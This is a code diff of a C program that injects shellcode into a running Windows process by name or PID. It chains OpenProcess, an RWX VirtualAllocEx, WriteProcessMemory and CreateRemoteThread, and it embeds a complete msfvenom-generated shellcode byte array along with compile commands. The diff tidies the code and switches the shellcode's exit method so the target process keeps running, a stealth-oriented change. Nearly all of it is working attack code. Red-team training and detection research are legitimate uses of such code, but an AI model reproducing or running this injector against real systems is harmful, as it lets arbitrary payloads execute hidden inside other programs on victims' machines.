@@ -1,19 +1,20 @@
 /*
- * Classic Process Injection — CreateRemoteThread
+ * Classic Shellcode Injection — CreateRemoteThread + VirtualAllocEx
  *
- * Technique: Allocate memory in target process, write shellcode, execute via
- *            CreateRemoteThread.
+ * MITRE ATT&CK: T1055.002 — Portable Executable Injection
+ *               (base: T1055 — Process Injection)
  *
- * MITRE ATT&CK: T1055.001 — Dynamic-link Library Injection
- *               T1055.003 — Thread Execution Hijacking
+ * Chain:
+ *   OpenProcess -> VirtualAllocEx(RWX) -> WriteProcessMemory ->
+ *   CreateRemoteThread(entry = shellcode address) -> shellcode runs
  *
  * Compile:
  *   x86_64-w64-mingw32-gcc -o inject.exe classic_injection.c
  *   cl classic_injection.c /Fe:inject.exe
  *
  * Usage:
- *   inject.exe <target_pid>
- *   inject.exe notepad     (by process name)
+ *   inject.exe <PID>
+ *   inject.exe notepad.exe
  */
 
 #include <windows.h>
@@ -21,8 +22,16 @@
 #include <stdio.h>
 #include <string.h>
 
-// x64 calc.exe shellcode — replace with your payload
-// Generate with: msfvenom -p windows/x64/exec CMD=calc.exe -f c
+/*
+ * x64 shellcode: WinExec("calc.exe", 0) + ExitThread
+ *
+ * Generated with:
+ *   msfvenom -p windows/x64/exec CMD=calc.exe EXITFUNC=thread -f c
+ *
+ * EXITFUNC=thread is critical: default EXITFUNC=process calls ExitProcess()
+ * on the target, killing it. EXITFUNC=thread only exits the injected
+ * thread, so the host process keeps running.
+ */
 unsigned char shellcode[] =
     "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"
     "\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"
@@ -39,30 +48,24 @@ unsigned char shellcode[] =
     "\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"
     "\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
     "\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f"
-    "\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff"
+    "\x87\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd\x9d\xff"
     "\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"
     "\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c"
     "\x63\x2e\x65\x78\x65\x00";
 
 
-DWORD FindProcessByName(const char* processName) {
-    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-    if (hSnap == INVALID_HANDLE_VALUE) return 0;
-
-    PROCESSENTRY32 pe;
-    pe.dwSize = sizeof(pe);
-
-    if (Process32First(hSnap, &pe)) {
+static DWORD find_pid_by_name(const char* name) {
+    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if (snap == INVALID_HANDLE_VALUE) return 0;
+    PROCESSENTRY32 pe = { .dwSize = sizeof(pe) };
+    DWORD pid = 0;
+    if (Process32First(snap, &pe)) {
         do {
-            if (_stricmp(pe.szExeFile, processName) == 0) {
-                CloseHandle(hSnap);
-                return pe.th32ProcessID;
-            }
-        } while (Process32Next(hSnap, &pe));
+            if (_stricmp(pe.szExeFile, name) == 0) { pid = pe.th32ProcessID; break; }
+        } while (Process32Next(snap, &pe));
     }
-
-    CloseHandle(hSnap);
-    return 0;
+    CloseHandle(snap);
+    return pid;
 }
 
 
@@ -76,73 +79,47 @@ int main(int argc, char* argv[]) {
 
     DWORD pid = atoi(argv[1]);
     if (pid == 0) {
-        // Treat as process name
-        char procName[256];
-        snprintf(procName, sizeof(procName), "%s", argv[1]);
-        if (!strstr(procName, ".exe")) {
-            strncat(procName, ".exe", sizeof(procName) - strlen(procName) - 1);
-        }
-        pid = FindProcessByName(procName);
-        if (pid == 0) {
-            printf("[-] Process not found: %s\n", procName);
-            return 1;
-        }
-        printf("[+] Found %s with PID: %lu\n", procName, pid);
+        char name[256];
+        snprintf(name, sizeof(name), "%s", argv[1]);
+        if (!strstr(name, ".exe")) strncat(name, ".exe", sizeof(name) - strlen(name) - 1);
+        pid = find_pid_by_name(name);
+        if (!pid) { printf("[-] Process not found: %s\n", name); return 1; }
+        printf("[+] Found %s @ PID %lu\n", name, pid);
     }
 
-    // Step 1: Open target process
-    printf("[*] Opening process %lu...\n", pid);
-    HANDLE hProcess = OpenProcess(
-        PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
-        PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ,
-        FALSE, pid);
+    printf("[*] Opening PID %lu...\n", pid);
+    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
+    if (!hProc) { printf("[-] OpenProcess failed (%lu)\n", GetLastError()); return 1; }
 
-    if (!hProcess) {
-        printf("[-] OpenProcess failed (error %lu). Need higher privileges?\n", GetLastError());
-        return 1;
-    }
-
-    // Step 2: Allocate memory in target
-    printf("[*] Allocating %zu bytes in remote process...\n", sizeof(shellcode));
-    LPVOID remoteAddr = VirtualAllocEx(hProcess, NULL, sizeof(shellcode),
+    printf("[*] Allocating %zu bytes RWX in target...\n", sizeof(shellcode));
+    LPVOID addr = VirtualAllocEx(hProc, NULL, sizeof(shellcode),
         MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    if (!addr) { printf("[-] VirtualAllocEx failed (%lu)\n", GetLastError()); CloseHandle(hProc); return 1; }
+    printf("[+] Allocated @ %p\n", addr);
 
-    if (!remoteAddr) {
-        printf("[-] VirtualAllocEx failed (error %lu)\n", GetLastError());
-        CloseHandle(hProcess);
+    SIZE_T written = 0;
+    if (!WriteProcessMemory(hProc, addr, shellcode, sizeof(shellcode), &written)) {
+        printf("[-] WriteProcessMemory failed (%lu)\n", GetLastError());
+        VirtualFreeEx(hProc, addr, 0, MEM_RELEASE);
+        CloseHandle(hProc);
         return 1;
     }
-    printf("[+] Allocated at: 0x%p\n", remoteAddr);
+    printf("[+] Wrote %zu bytes\n", written);
 
-    // Step 3: Write shellcode
-    SIZE_T bytesWritten;
-    if (!WriteProcessMemory(hProcess, remoteAddr, shellcode, sizeof(shellcode), &bytesWritten)) {
-        printf("[-] WriteProcessMemory failed (error %lu)\n", GetLastError());
-        VirtualFreeEx(hProcess, remoteAddr, 0, MEM_RELEASE);
-        CloseHandle(hProcess);
+    printf("[*] CreateRemoteThread with shellcode as entry...\n");
+    HANDLE hT = CreateRemoteThread(hProc, NULL, 0,
+        (LPTHREAD_START_ROUTINE)addr, NULL, 0, NULL);
+    if (!hT) {
+        printf("[-] CreateRemoteThread failed (%lu)\n", GetLastError());
+        VirtualFreeEx(hProc, addr, 0, MEM_RELEASE);
+        CloseHandle(hProc);
         return 1;
     }
-    printf("[+] Written %zu bytes\n", bytesWritten);
+    printf("[+] Remote thread fired. Shellcode running in PID %lu.\n", pid);
+    printf("[+] Target survives (shellcode exits via ExitThread, not ExitProcess).\n");
 
-    // Step 4: Create remote thread
-    printf("[*] Creating remote thread...\n");
-    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0,
-        (LPTHREAD_START_ROUTINE)remoteAddr, NULL, 0, NULL);
-
-    if (!hThread) {
-        printf("[-] CreateRemoteThread failed (error %lu)\n", GetLastError());
-        VirtualFreeEx(hProcess, remoteAddr, 0, MEM_RELEASE);
-        CloseHandle(hProcess);
-        return 1;
-    }
-
-    printf("[+] Thread created! Shellcode executing in PID %lu\n", pid);
-    printf("[+] Injection successful.\n");
-
-    WaitForSingleObject(hThread, 5000);
-
-    CloseHandle(hThread);
-    CloseHandle(hProcess);
-
+    WaitForSingleObject(hT, 5000);
+    CloseHandle(hT);
+    CloseHandle(hProc);
     return 0;
 }
